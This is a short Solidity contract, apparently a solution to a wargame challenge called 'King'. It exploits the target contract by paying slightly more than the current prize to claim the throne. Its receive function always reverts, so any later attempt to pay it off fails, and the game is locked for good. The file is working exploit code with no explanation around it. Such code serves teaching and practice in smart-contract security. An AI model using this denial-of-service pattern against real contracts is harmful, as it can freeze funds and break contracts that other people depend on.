// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./King.sol";
import "hardhat/console.sol";

contract KingExploiter {

  King public victimContract;


  constructor() payable {

  }

  function attack(address targetContractAddress) external {
      victimContract = King(payable(targetContractAddress));

      uint prize = victimContract.prize();

      // Become the new kingcontract
      targetContractAddress.call{value: prize + 2, gas: 90000}("");
      address newKing = victimContract._king();
  }

  receive() external payable {
    revert("Fallback function always fails");
  }
}